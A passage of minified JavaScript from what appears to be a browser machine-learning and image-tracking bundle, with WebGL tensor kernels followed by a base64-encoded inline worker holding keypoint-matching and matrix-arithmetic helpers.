yCeil = yFloor + 1.0;\n                  float xCeil = xFloor + 1.0;\n                  float valueYFloor = (xCeil - mapX) *\n                  readWithFillValue(batch, int(yFloor), int(xFloor), channel) +\n                  (mapX - xFloor) *\n                  readWithFillValue(batch, int(yFloor), int(xCeil), channel);\n                  float valueYCeil = (xCeil - mapX) *\n                  readWithFillValue(batch, int(yCeil), int(xFloor), channel) +\n                  (mapX - xFloor) *\n                  readWithFillValue(batch, int(yCeil), int(xCeil), channel);\n                  outputValue = (yCeil - mapY) * valueYFloor +\n                  (mapY - yFloor) * valueYCeil;\n                }\n              }\n              setOutput(outputValue);\n            }\n        `
        }
    }
    const OH = {
        kernelName: Ou,
        backendName: "webgl",
        kernelFunc: function PH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {image: o, transforms: r} = t
              , {interpolation: i, fillMode: a, fillValue: c, outputShape: l} = s
              , [u,d,h,p] = o.shape
              , [f,m] = l ?? [d, h]
              , b = new AH(d,h,i,a,c,[u, f, m, p]);
            return e.runWebGLProgram(b, [o, r], "float32")
        }
    };
    const ZH = {
        kernelName: Ku,
        backendName: "webgl",
        kernelFunc: function KH(n) {
            const {inputs: t, attrs: e, backend: s} = n
              , {axis: o} = e
              , {x: r} = t;
            ra(r, "unique"),
            console.warn("WARNING: ", "UI might be locked temporarily as data is being downloaded");
            const i = s.readSync(r.dataId)
              , {outputValues: a, outputShape: c, indices: l} = Fz(i, o, r.shape, r.dtype);
            return [s.makeTensorInfo(c, r.dtype, a), s.makeTensorInfo([l.length], "int32", l)]
        }
    };
    const HH = {
        kernelName: gc,
        backendName: "webgl",
        kernelFunc: function BH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {value: o} = t;
            let {axis: r} = s;
            r < 0 && (r += o.shape.length);
            const i = o
              , a = i.shape.length
              , c = o.shape[r]
              , l = new Array(a - 1);
            let u = 0;
            for (let m = 0; m < a; m++)
                m !== r && (l[u++] = i.shape[m]);
            const d = []
              , h = new Array(a).fill(0)
              , p = i.shape.slice();
            p[r] = 1;
            const f = new Array(c);
            for (let m = 0; m < f.length; m++) {
                h[r] = m;
                const g = xr({
                    inputs: {
                        x: i
                    },
                    backend: e,
                    attrs: {
                        begin: h,
                        size: p
                    }
                })
                  , b = tt({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: l
                    }
                });
                f[m] = b,
                d.push(g)
            }
            return d.forEach((m=>e.disposeIntermediateTensorInfo(m))),
            f
        }
    };
    class _H {
        constructor(t, e) {
            this.variableNames = ["x", "segmentIds"];
            const s = t.windowSize
              , o = t.batchSize
              , r = t.inSize
              , i = t.numSegments
              , a = i * Math.ceil(r / s);
            this.outputShape = [o, a];
            const u = 4 * Math.floor(s / 4)
              , d = s % 4
              , h = "\n        sumValue += dot(values, segFilter);\n    ";
            let p = "";
            r % s > 0 && (p = `\n        if (inIdx < 0 || inIdx >= ${r}) {\n          return initializationValue;\n        }\n      `);
            let f = "";
            r % s > 0 && (f = `\n        if (inIdx < 0 || inIdx >= ${r}) {\n          return -1.0;\n        }\n      `),
            this.userCode = `\n      const float initializationValue = 0.0;\n\n      float getValue(int batch, int inIdx) {\n        ${p}\n        return getX(batch, inIdx);\n      }\n\n      float getSegmentIdAtIndex(int inIdx) {\n        ${f}\n        return getSegmentIds(inIdx);\n      }\n\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int batch = coords[0];\n        int outIdx = coords[1];\n        int inOffset = int(floor(float(outIdx) / float(\n          ${i})) * float(${s}));\n        int currentSeg = int(mod(float(outIdx), float(${i})));\n\n        float sumValue = 0.0;\n\n        for (int i = 0; i < ${u}; i += 4) {\n          int inIdx = inOffset + i;\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            getValue(batch, inIdx + 2),\n            getValue(batch, inIdx + 3)\n          );\n\n          vec4 segFilter = vec4(\n            int(getSegmentIdAtIndex(inIdx)) == currentSeg ? 1 : 0,\n            int(getSegmentIdAtIndex(inIdx + 1)) == currentSeg ? 1 : 0,\n            int(getSegmentIdAtIndex(inIdx + 2)) == currentSeg ? 1 : 0,\n            int(getSegmentIdAtIndex(inIdx + 3)) == currentSeg ? 1 : 0\n          );\n\n          ${h}\n        }\n\n        int inIdx = inOffset + ${u};\n        if (${1 === d}) {\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            initializationValue,\n            initializationValue,\n            initializationValue\n          );\n\n          int inIdxSeg = int(getSegmentIdAtIndex(inIdx));\n\n          vec4 segFilter = vec4(\n            int(getSegmentIdAtIndex(inIdx)) == currentSeg ? 1 : 0,\n            0,\n            0,\n            0\n          );\n\n          ${h}\n        } else if (${2 === d}) {\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            initializationValue,\n            initializationValue\n          );\n\n          vec4 segFilter = vec4(\n            int(getSegmentIdAtIndex(inIdx)) == currentSeg ? 1 : 0,\n            int(getSegmentIdAtIndex(inIdx + 1)) == currentSeg ? 1 : 0,\n              0,\n              0\n          );\n\n          ${h}\n        } else if (${3 === d}) {\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            getValue(batch, inIdx + 2),\n            initializationValue\n          );\n\n          vec4 segFilter = vec4(\n            int(getSegmentIdAtIndex(inIdx)) == currentSeg ? 1 : 0,\n            int(getSegmentIdAtIndex(inIdx + 1)) == currentSeg ? 1 : 0,\n            int(getSegmentIdAtIndex(inIdx + 2)) == currentSeg ? 1 : 0,\n            0\n          );\n\n          ${h}\n        }\n        setOutput(sumValue);\n      }\n    `
        }
    }
    const YH = {
        kernelName: bc,
        backendName: "webgl",
        kernelFunc: function UH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, segmentIds: r} = t
              , {numSegments: i} = s
              , a = o.shape.length
              , c = [];
            let l = 0;
            const u = Yt([l], a);
            let d = o;
            null != u && (d = Me({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: u
                }
            }),
            c.push(d),
            l = ee(1, a)[0]);
            const h = Qg(d.shape, l, i)
              , p = Z([d.shape[l]])
              , f = tt({
                inputs: {
                    x: d
                },
                backend: e,
                attrs: {
                    shape: [-1, p]
                }
            });
            c.push(f);
            const m = nd(o.dtype)
              , g = (y,w,C,k,S)=>{
                const T = y.shape[0]
                  , R = y.shape[1]
                  , L = Yg(R, S)
                  , F = new _H({
                    windowSize: L,
                    inSize: R,
                    batchSize: T,
                    numSegments: S
                },w)
                  , X = e.compileAndRun(F, [y, C], k);
                if (c.push(X),
                X.shape[1] === S)
                    return X;
                const A = yI({
                    backend: e,
                    attrs: {
                        start: 0,
                        stop: S,
                        step: 1,
                        dtype: "float32"
                    }
                })
                  , P = CI({
                    inputs: {
                        x: A
                    },
                    backend: e,
                    attrs: {
                        reps: [R / L]
                    }
                });
                return c.push(A),
                c.push(P),
                g(X, w, P, k, S)
            }
              , x = tt({
                inputs: {
                    x: g(f, "unsortedSegmentSum", r, m, i)
                },
                backend: e,
                attrs: {
                    shape: h
                }
            });
            let I = x;
            if (null != u) {
                c.push(x);
                const y = Cs(u);
                I = Me({
                    inputs: {
                        x: I
                    },
                    backend: e,
                    attrs: {
                        perm: y
                    }
                })
            }
            return c.forEach((y=>e.disposeIntermediateTensorInfo(y))),
            I
        }
    }
      , QH = [RX, GX, DX, VX, zX, PX, KX, BX, YX, JX, tA, sA, iA, uA, pA, mA, bA, wA, vA, kA, RA, WA, VA, AA, OA, _A, YA, qA, dX, nP, aP, dP, bP, IP, CP, SP, TP, GP, EP, WP, VP, zP, AP, KP, BP, YP, JP, tO, sO, rO, aO, uO, hO, mO, bO, xO, IO, CO, SO, TO, RO, GO, DO, VO, zO, PO, ZO, HO, UO, uX, QO, rP, jO, tK, nK, pX, oK, iK, cK, dK, fK, gK, xK, IK, vK, kK, NK, LK, DK, MK, XK, PK, KK, BK, _K, JK, tZ, oZ, uZ, gX, fZ, bZ, IZ, vZ, KA, kZ, NZ, $Z, EZ, VZ, mX, zZ, AZ, OZ, ZZ, BZ, ZA, iZ, _Z, QZ, qZ, xX, sB, iB, uB, pB, bB, yB, wB, vB, TB, $B, EB, MB, zB, AB, ZB, HB, DA, cZ, UB, YB, JB, qB, eH, sH, rH, aH, lH, dH, pH, mH, bH, IH, CH, SH, TH, aZ, kX, RH, GH, EH, MH, XH, OH, TX, ZH, HH, YH, TZ];
    for (const n of QH)
        qe(n);
    const SI = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2NsYXNzIFd0e2NvbnN0cnVjdG9yKG49W10sZT1RdCl7aWYodGhpcy5kYXRhPW4sdGhpcy5sZW5ndGg9dGhpcy5kYXRhLmxlbmd0aCx0aGlzLmNvbXBhcmU9ZSx0aGlzLmxlbmd0aD4wKWZvcihsZXQgdD0odGhpcy5sZW5ndGg+PjEpLTE7dD49MDt0LS0pdGhpcy5fZG93bih0KX1wdXNoKG4pe3RoaXMuZGF0YS5wdXNoKG4pLHRoaXMubGVuZ3RoKyssdGhpcy5fdXAodGhpcy5sZW5ndGgtMSl9cG9wKCl7aWYodGhpcy5sZW5ndGg9PT0wKXJldHVybjtjb25zdCBuPXRoaXMuZGF0YVswXSxlPXRoaXMuZGF0YS5wb3AoKTtyZXR1cm4gdGhpcy5sZW5ndGgtLSx0aGlzLmxlbmd0aD4wJiYodGhpcy5kYXRhWzBdPWUsdGhpcy5fZG93bigwKSksbn1wZWVrKCl7cmV0dXJuIHRoaXMuZGF0YVswXX1fdXAobil7Y29uc3R7ZGF0YTplLGNvbXBhcmU6dH09dGhpcyxzPWVbbl07Zm9yKDtuPjA7KXtjb25zdCByPW4tMT4+MSxpPWVbcl07aWYodChzLGkpPj0wKWJyZWFrO2Vbbl09aSxuPXJ9ZVtuXT1zfV9kb3duKG4pe2NvbnN0e2RhdGE6ZSxjb21wYXJlOnR9PXRoaXMscz10aGlzLmxlbmd0aD4+MSxyPWVbbl07Zm9yKDtuPHM7KXtsZXQgaT0objw8MSkrMSxoPWVbaV07Y29uc3QgbD1pKzE7aWYobDx0aGlzLmxlbmd0aCYmdChlW2xdLGgpPDAmJihpPWwsaD1lW2xdKSx0KGgscik+PTApYnJlYWs7ZVtuXT1oLG49aX1lW25dPXJ9fWZ1bmN0aW9uIFF0KG8sbil7cmV0dXJuIG88bj8tMTpvPm4/MTowfWNvbnN0IHl0PW89Pntjb25zdHt2MTpuLHYyOmV9PW87bGV0IHQ9MDtmb3IobGV0IHM9MDtzPG4ubGVuZ3RoO3MrKyl7bGV0IHI9KG5bc11eZVtzXSk+Pj4wO3QrPVp0KHIpfXJldHVybiB0fSxadD1vPT57dmFyIG49by0obz4+MSYxNDMxNjU1NzY1KTtyZXR1cm4gbj0obj4+MiY4NTg5OTM0NTkpKyhuJjg1ODk5MzQ1OSksbj0obj4+NCkrbiYyNTI2NDUxMzUsbj0obj4+OCkrbiYxNjcxMTkzNSxuPShuPj4xNikrbiY2NTUzNSxufSxjdD0xLHZ0PW89Pntjb25zdHtrZXl3aWR0aDpuLGtleWhlaWdodDplLHF1ZXJ5d2lkdGg6dCxxdWVyeWhlaWdodDpzLG1hdGNoZXM6cn09byxpPXQqMS4yLGg9LWksbD1zKjEuMix1PS1sLGY9MTIsZz0xMCxhPS0xLGo9MSx5PTEvTWF0aC5sb2coMTApLG09TWF0aC5tYXgobixlKSxNPU1hdGguZmxvb3Iobi8yKSxUPU1hdGguZmxvb3IoZS8yKSxFPVtdO2ZvcihsZXQgTj0wO048ci5sZW5ndGg7TisrKXtjb25zdCAkPXJbTl0ucXVlcnlwb2ludC5zY2FsZSxLPXJbTl0ua2V5cG9pbnQuc2NhbGU7Sz09MCYmY29uc29sZS5sb2coIkVSUk9SIGRpdmlkZSB6ZXJvIik7Y29uc3Qgdj0kL0s7RS5wdXNoKHYqbSl9RS5zb3J0KChOLCQpPT5OLSQpO2NvbnN0IFI9LjI1KkVbTWF0aC5mbG9vcihFLmxlbmd0aC8yKS0oRS5sZW5ndGglMj09MD8xOjApLTFdLHE9TWF0aC5tYXgoNSxNYXRoLmNlaWwoKGktaCkvUikpLEk9TWF0aC5tYXgoNSxNYXRoLmNlaWwoKGwtdSkvUikpLHo9cSpJLEI9eipmLGM9W10scD1bXSxTPXt9O2ZvcihsZXQgTj0wO048ci5sZW5ndGg7TisrKXtjb25zdCAkPXJbTl0ucXVlcnlwb2ludCxLPXJbTl0ua2V5cG9pbnQse3g6dix5OlYsc2NhbGU6TCxhbmdsZTpDfT14dCh7cXVlcnlwb2ludDokLGtleXBvaW50Okssa2V5Y2VudGVyWDpNLGtleWNlbnRlclk6VCxzY2FsZU9uZU92ZXJMb2dLOnl9KTtpZih2PGh8fHY+PWl8fFY8dXx8Vj49bHx8Qzw9LU1hdGguUEl8fEM+TWF0aC5QSXx8TDxhfHxMPj1qKXtjW05dPSExO2NvbnRpbnVlfWxldCBYPXEqKHYtaCkvKGktaCksd3Q9SSooVi11KS8obC11KSxwdD1mKihDK01hdGguUEkpLygyKk1hdGguUEkpLGR0PWcqKEwtYSkvKGotYSk7cFtOXT17YmluWDpYLGJpblk6d3QsYmluQW5nbGU6cHQsYmluU2NhbGU6ZHR9O2xldCBpdD1NYXRoLmZsb29yKFgtLjUpLGx0PU1hdGguZmxvb3Iod3QtLjUpLGh0PU1hdGguZmxvb3IoZHQtLjUpLGp0PShNYXRoLmZsb29yKHB0LS41KStmKSVmO2lmKGl0PDB8fGl0KzE+PXF8fGx0PDB8fGx0KzE+PUl8fGh0PDB8fGh0KzE+PWcpe2NbTl09ITE7Y29udGludWV9Zm9yKGxldCB1dD0wO3V0PDI7dXQrKyl7bGV0IGt0PWl0K3V0O2ZvcihsZXQgYnQ9MDtidDwyO2J0Kyspe2xldCB1bj1sdCtidDtmb3IobGV0IEl0PTA7SXQ8MjtJdCsrKXtsZXQgY249KGp0K0l0KSVmO2ZvcihsZXQgUnQ9MDtSdDwyO1J0Kyspe2xldCBmbj1odCtSdDtjb25zdCBOdD1rdCt1bipxK2NuKnorZm4qQjtTW050XT09PXZvaWQgMCYmKFNbTnRdPTApLFNbTnRdKz0xfX19fWNbTl09ITB9bGV0IGQ9MCxEPS0xO2lmKE9iamVjdC5rZXlzKFMpLmZvckVhY2goTj0+e1NbTl0+ZCYmKGQ9U1tOXSxEPU4pfSksZDwzKXJldHVybltdO2NvbnN0IFU9TWF0aC5mbG9vcihEJUIleiVxKSxGPU1hdGguZmxvb3IoKEQtVSklQiV6L3EpLFA9TWF0aC5mbG9vcigoRC1VLUYqcSklQi96KSxZPU1hdGguZmxvb3IoKEQtVS1GKnEtUCp6KS9CKSxHPVtdO2ZvcihsZXQgTj0wO048ci5sZW5ndGg7TisrKXtpZighY1tOXSljb250aW51ZTtjb25zdCAkPXBbTl07aWYoTWF0aC5hYnMoJC5iaW5YLShVKy41KSk+PWN0fHxNYXRoLmFicygkLmJpblktKEYrLjUpKT49Y3R8fE1hdGguYWJzKCQuYmluU2NhbGUtKFkrLjUpKT49Y3QpY29udGludWU7Y29uc3QgTD1NYXRoLmFicygkLmJpbkFuZ2xlLShQKy41KSk7TWF0aC5taW4oTCxmLUwpPj1jdHx8Ry5wdXNoKHJbTl0pfXJldHVybiBHfSx4dD0oe3F1ZXJ5cG9pbnQ6byxrZXlwb2ludDpuLGtleWNlbnRlclg6ZSxrZXljZW50ZXJZOnQsc2NhbGVPbmVPdmVyTG9nSzpzfSk9PntsZXQgcj1vLmFuZ2xlLW4uYW5nbGU7cjw9LU1hdGguUEk/cis9MipNYXRoLlBJOnI+TWF0aC5QSSYmKHItPTIqTWF0aC5QSSk7Y29uc3QgaT1vLnNjYWxlL24uc2NhbGUsaD1pKk1hdGguY29zKHIpLGw9aSpNYXRoLnNpbihyKSx1PVtoLC1sLGwsaF0sZj1bdVswXSpuLngrdVsxXSpuLnksdVsyXSpuLngrdVszXSpuLnldLGc9by54LWZbMF0sYT1vLnktZlsxXTtyZXR1cm57eDp1WzBdKmUrdVsxXSp0K2cseTp1WzJdKmUrdVszXSp0K2EsYW5nbGU6cixzY2FsZTpNYXRoLmxvZyhpKSpzfX0sQXQ9T2JqZWN0LnByb3RvdHlwZS50b1N0cmluZztmdW5jdGlvbiBXKG8pe3JldHVybiBBdC5jYWxsKG8pLmVuZHNXaXRoKCJBcnJheV0iKX1mdW5jdGlvbiB0ZShvKXt2YXIgbj1hcmd1bWVudHMubGVuZ3RoPjEmJmFyZ3VtZW50c1sxXSE9PXZvaWQgMD9hcmd1bWVudHNbMV06e307aWYoIVcobykpdGhyb3cgbmV3IFR5cGVFcnJvcigiaW5wdXQgbXVzdCBiZSBhbiBhcnJheSIpO2lmKG8ubGVuZ3RoPT09MCl0aHJvdyBuZXcgVHlwZUVycm9yKCJpbnB1dCBtdXN0IG5vdCBiZSBlbXB0eSIpO3ZhciBlPW4uZnJvbUluZGV4LHQ9ZT09PXZvaWQgMD8wOmUscz1uLnRvSW5kZXgscj1zPT09dm9pZCAwP28ubGVuZ3RoOnM7aWYodDwwfHx0Pj1vLmxlbmd0aHx8IU51bWJlci5pc0ludGVnZXIodCkpdGhyb3cgbmV3IEVycm9yKCJmcm9tSW5kZXggbXVzdCBiZSBhIHBvc2l0aXZlIGludGVnZXIgc21hbGxlciB0aGFuIGxlbmd0aCIpO2lmKHI8PXR8fHI+by5sZW5ndGh8fCFOdW1iZXIuaXNJbnRlZ2VyKHIpKXRocm93IG5ldyBFcnJvcigidG9JbmRleCBtdXN0IGJlIGFuIGludGVnZXIgZ3JlYXRlciB0aGFuIGZyb21JbmRleCBhbmQgYXQgbW9zdCBlcXVhbCB0byBsZW5ndGgiKTtmb3IodmFyIGk9b1t0XSxoPXQrMTtoPHI7aCsrKW9baF0+aSYmKGk9b1toXSk7cmV0dXJuIGl9ZnVuY3Rpb24gZWUobyl7dmFyIG49YXJndW1lbnRzLmxlbmd0aD4xJiZhcmd1bWVudHNbMV0hPT12b2lkIDA/YXJndW1lbnRzWzFdOnt9O2lmKCFXKG8pKXRocm93IG5ldyBUeXBlRXJyb3IoImlucHV0IG11c3QgYmUgYW4gYXJyYXkiKTtpZihvLmxlbmd0aD09PTApdGhyb3cgbmV3IFR5cGVFcnJvcigiaW5wdXQgbXVzdCBub3QgYmUgZW1wdHkiKTt2YXIgZT1uLmZyb21JbmRleCx0PWU9PT12b2lkIDA/MDplLHM9bi50b0luZGV4LHI9cz09PXZvaWQgMD9vLmxlbmd0aDpzO2lmKHQ8MHx8dD49by5sZW5ndGh8fCFOdW1iZXIuaXNJbnRlZ2VyKHQpKXRocm93IG5ldyBFcnJvcigiZnJvbUluZGV4IG11c3QgYmUgYSBwb3NpdGl2ZSBpbnRlZ2VyIHNtYWxsZXIgdGhhbiBsZW5ndGgiKTtpZihyPD10fHxyPm8ubGVuZ3RofHwhTnVtYmVyLmlzSW50ZWdlcihyKSl0aHJvdyBuZXcgRXJyb3IoInRvSW5kZXggbXVzdCBiZSBhbiBpbnRlZ2VyIGdyZWF0ZXIgdGhhbiBmcm9tSW5kZXggYW5kIGF0IG1vc3QgZXF1YWwgdG8gbGVuZ3RoIik7Zm9yKHZhciBpPW9bdF0saD10KzE7aDxyO2grKylvW2hdPGkmJihpPW9baF0pO3JldHVybiBpfWZ1bmN0aW9uIHF0KG8pe3ZhciBuPWFyZ3VtZW50cy5sZW5ndGg+MSYmYXJndW1lbnRzWzFdIT09dm9pZCAwP2FyZ3VtZW50c1sxXTp7fTtpZihXKG8pKXtpZihvLmxlbmd0aD09PTApdGhyb3cgbmV3IFR5cGVFcnJvcigiaW5wdXQgbXVzdCBub3QgYmUgZW1wdHkiKX1lbHNlIHRocm93IG5ldyBUeXBlRXJyb3IoImlucHV0IG11c3QgYmUgYW4gYXJyYXkiKTt2YXIgZTtpZihuLm91dHB1dCE9PXZvaWQgMCl7aWYoIVcobi5vdXRwdXQpKXRocm93IG5ldyBUeXBlRXJyb3IoIm91dHB1dCBvcHRpb24gbXVzdCBiZSBhbiBhcnJheSBpZiBzcGVjaWZpZWQiKTtlPW4ub3V0cHV0fWVsc2UgZT1uZXcgQXJyYXkoby5sZW5ndGgpO3ZhciB0PWVlKG8pLHM9dGUobyk7aWYodD09PXMpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIm1pbmltdW0gYW5kIG1heGltdW0gaW5wdXQgdmFsdWVzIGFyZSBlcXVhbC4gQ2Fubm90IHJlc2NhbGUgYSBjb25zdGFudCBhcnJheSIpO3ZhciByPW4ubWluLGk9cj09PXZvaWQgMD9uLmF1dG9NaW5NYXg/dDowOnIsaD1uLm1heCxsPWg9PT12b2lkIDA/bi5hdXRvTWluTWF4P3M6MTpoO2lmKGk+PWwpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIm1pbiBvcHRpb24gbXVzdCBiZSBzbWFsbGVyIHRoYW4gbWF4IG9wdGlvbiIpO2Zvcih2YXIgdT0obC1pKS8ocy10KSxmPTA7ZjxvLmxlbmd0aDtmKyspZVtmXT0ob1tmXS10KSp1K2k7cmV0dXJuIGV9Y29uc3QgZnQ9IiAiLnJlcGVhdCgyKSxfdD0iICIucmVwZWF0KDQpO2Z1bmN0aW9uIG5lKCl7cmV0dXJuIFR0KHRoaXMpfWZ1bmN0aW9uIFR0KG8sbj17fSl7Y29uc3R7bWF4Um93czplPTE1LG1heENvbHVtbnM6dD0xMCxtYXhOdW1TaXplOnM9OCxwYWRNaW51czpyPSJhdXRvIn09bjtyZXR1cm5gJHtvLmNvbnN0cnVjdG9yLm5hbWV9IHsKJHtmdH1bCiR7X3R9JHtzZShvLGUsdCxzLHIpfQoke2Z0fV0KJHtmdH1yb3dzOiAke28ucm93c30KJHtmdH1jb2x1bW5zOiAke28uY29sdW1uc30KfWB9ZnVuY3Rpb24gc2UobyxuLGUsdCxzKXtjb25zdHtyb3dzOnIsY29sdW1uczppfT1vLGg9TWF0aC5taW4ocixuKSxsPU1hdGgubWluKGksZSksdT1bXTtpZihzPT09ImF1dG8iKXtzPSExO3Q6Zm9yKGxldCBmPTA7ZjxoO2YrKylmb3IobGV0IGc9MDtnPGw7ZysrKWlmKG8uZ2V0KGYsZyk8MCl7cz0hMDticmVhayB0fX1mb3IobGV0IGY9MDtmPGg7ZisrKXtsZXQgZz1bXTtmb3IobGV0IGE9MDthPGw7YSsrKWcucHVzaChvZShvLmdldChmLGEpLHQscykpO3UucHVzaChgJHtnLmpvaW4oIiAiKX1gKX1yZXR1cm4gbCE9PWkmJih1W3UubGVuZ3RoLTFdKz1gIC4uLiAke2ktZX0gbW9yZSBjb2x1bW5zYCksaCE9PXImJnUucHVzaChgLi4uICR7ci1ufSBtb3JlIHJvd3NgKSx1LmpvaW4oYAoke190fWApfWZ1bmN0aW9uIG9lKG8sbixlKXtyZXR1cm4obz49MCYmZT9gICR7enQobyxuLTEpfWA6enQobyxuKSkucGFkRW5kKG4pfWZ1bmN0aW9uIHp0KG8sbil7bGV0IGU9by50b1N0cmluZygpO2lmKGUubGVuZ3RoPD1uKXJldHVybiBlO2xldCB0PW8udG9GaXhlZChuKTtpZih0Lmxlbmd0aD5uJiYodD1vLnRvRml4ZWQoTWF0aC5tYXgoMCxuLSh0Lmxlbmd0aC1uKSkpKSx0Lmxlbmd0aDw9biYmIXQuc3RhcnRzV2l0aCgiMC4wMDAiKSYmIXQuc3RhcnRzV2l0aCgiLTAuMDAwIikpcmV0dXJuIHQ7bGV0IHM9by50b0V4cG9uZW50aWFsKG4pO3JldHVybiBzLmxlbmd0aD5uJiYocz1vLnRvRXhwb25lbnRpYWwoTWF0aC5tYXgoMCxuLShzLmxlbmd0aC1uKSkpKSxzLnNsaWNlKDApfWZ1bmN0aW9uIHJlKG8sbil7by5wcm90b3R5cGUuYWRkPWZ1bmN0aW9uKHQpe3JldHVybiB0eXBlb2YgdD09Im51bWJlciI/dGhpcy5hZGRTKHQpOnRoaXMuYWRkTSh0KX0sby5wcm90b3R5cGUuYWRkUz1mdW5jdGlvbih0KXtmb3IobGV0IHM9MDtzPHRoaXMucm93cztzKyspZm9yKGxldCByPTA7cjx0aGlzLmNvbHVtbnM7cisrKXRoaXMuc2V0KHMscix0aGlzLmdldChzLHIpK3QpO3JldHVybiB0aGlzfSxvLnByb3RvdHlwZS5hZGRNPWZ1bmN0aW9uKHQpe2lmKHQ9bi5jaGVja01hdHJpeCh0KSx0aGlzLnJvd3MhPT10LnJvd3N8fHRoaXMuY29sdW1ucyE9PXQuY29sdW1ucyl0aHJvdyBuZXcgUmFuZ2VFcnJvcigiTWF0cmljZXMgZGltZW5zaW9ucyBtdXN0IGJlIGVxdWFsIik7Zm9yKGxldCBzPTA7czx0aGlzLnJvd3M7cysrKWZvcihsZXQgcj0wO3I8dGhpcy5jb2x1bW5zO3IrKyl0aGlzLnNldChzLHIsdGhpcy5nZXQocyxyKSt0LmdldChzLHIpKTtyZXR1cm4gdGhpc30sby5hZGQ9ZnVuY3Rpb24odCxzKXtyZXR1cm4gbmV3IG4odCkuYWRkKHMpfSxvLnByb3RvdHlwZS5zdWI9ZnVuY3Rpb24odCl7cmV0dXJuIHR5cGVvZiB0PT0ibnVtYmVyIj90aGlzLnN1YlModCk6dGhpcy5zdWJNKHQpfSxvLnByb3RvdHlwZS5zdWJTPWZ1bmN0aW9uKHQpe2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMsciktdCk7cmV0dXJuIHRoaXN9LG8ucHJvdG90eXBlLnN1Yk09ZnVuY3Rpb24odCl7aWYodD1uLmNoZWNrTWF0cml4KHQpLHRoaXMucm93cyE9PXQucm93c3x8dGhpcy5jb2x1bW5zIT09dC5jb2x1bW5zKXRocm93IG5ldyBSYW5nZUVycm9yKCJNYXRyaWNlcyBkaW1lbnNpb25zIG11c3QgYmUgZXF1YWwiKTtmb3IobGV0IHM9MDtzPHRoaXMucm93cztzKyspZm9yKGxldCByPTA7cjx0aGlzLmNvbHVtbnM7cisrKXRoaXMuc2V0KHMscix0aGlzLmdldChzLHIpLXQuZ2V0KHMscikpO3JldHVybiB0aGlzfSxvLnN1Yj1mdW5jdGlvbih0LHMpe3JldHVybiBuZXcgbih0KS5zdWIocyl9LG8ucHJvdG90eXBlLnN1YnRyYWN0PW8ucHJvdG90eXBlLnN1YixvLnByb3RvdHlwZS5zdWJ0cmFjdFM9by5wcm90b3R5cGUuc3ViUyxvLnByb3RvdHlwZS5zdWJ0cmFjdE09by5wcm90b3R5cGUuc3ViTSxvLnN1YnRyYWN0PW8uc3ViLG8ucHJvdG90eXBlLm11bD1mdW5jdGlvbih0KXtyZXR1cm4gdHlwZW9mIHQ9PSJudW1iZXIiP3RoaXMubXVsUyh0KTp0aGlzLm11bE0odCl9LG8ucHJvdG90eXBlLm11bFM9ZnVuY3Rpb24odCl7Zm9yKGxldCBzPTA7czx0aGlzLnJvd3M7cysrKWZvcihsZXQgcj0wO3I8dGhpcy5jb2x1bW5zO3IrKyl0aGlzLnNldChzLHIsdGhpcy5nZXQocyxyKSp0KTtyZXR1cm4gdGhpc30sby5wcm90b3R5cGUubXVsTT1mdW5jdGlvbih0KXtpZih0PW4uY2hlY2tNYXRyaXgodCksdGhpcy5yb3dzIT09dC5yb3dzfHx0aGlzLmNvbHVtbnMhPT10LmNvbHVtbnMpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIk1hdHJpY2VzIGRpbWVuc2lvbnMgbXVzdCBiZSBlcXVhbCIpO2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMscikqdC5nZXQocyxyKSk7cmV0dXJuIHRoaXN9LG8ubXVsPWZ1bmN0aW9uKHQscyl7cmV0dXJuIG5ldyBuKHQpLm11bChzKX0sby5wcm90b3R5cGUubXVsdGlwbHk9by5wcm90b3R5cGUubXVsLG8ucHJvdG90eXBlLm11bHRpcGx5Uz1vLnByb3RvdHlwZS5tdWxTLG8ucHJvdG90eXBlLm11bHRpcGx5TT1vLnByb3RvdHlwZS5tdWxNLG8ubXVsdGlwbHk9by5tdWwsby5wcm90b3R5cGUuZGl2PWZ1bmN0aW9uKHQpe3JldHVybiB0eXBlb2YgdD09Im51bWJlciI/dGhpcy5kaXZTKHQpOnRoaXMuZGl2TSh0KX0sby5wcm90b3R5cGUuZGl2Uz1mdW5jdGlvbih0KXtmb3IobGV0IHM9MDtzPHRoaXMucm93cztzKyspZm9yKGxldCByPTA7cjx0aGlzLmNvbHVtbnM7cisrKXRoaXMuc2V0KHMscix0aGlzLmdldChzLHIpL3QpO3JldHVybiB0aGlzfSxvLnByb3RvdHlwZS5kaXZNPWZ1bmN0aW9uKHQpe2lmKHQ9bi5jaGVja01hdHJpeCh0KSx0aGlzLnJvd3MhPT10LnJvd3N8fHRoaXMuY29sdW1ucyE9PXQuY29sdW1ucyl0aHJvdyBuZXcgUmFuZ2VFcnJvcigiTWF0cmljZXMgZGltZW5zaW9ucyBtdXN0IGJlIGVxdWFsIik7Zm9yKGxldCBzPTA7czx0aGlzLnJvd3M7cysrKWZvcihsZXQgcj0wO3I8dGhpcy5jb2x1bW5zO3IrKyl0aGlzLnNldChzLHIsdGhpcy5nZXQocyxyKS90LmdldChzLHIpKTtyZXR1cm4gdGhpc30sby5kaXY9ZnVuY3Rpb24odCxzKXtyZXR1cm4gbmV3IG4odCkuZGl2KHMpfSxvLnByb3RvdHlwZS5kaXZpZGU9by5wcm90b3R5cGUuZGl2LG8ucHJvdG90eXBlLmRpdmlkZVM9by5wcm90b3R5cGUuZ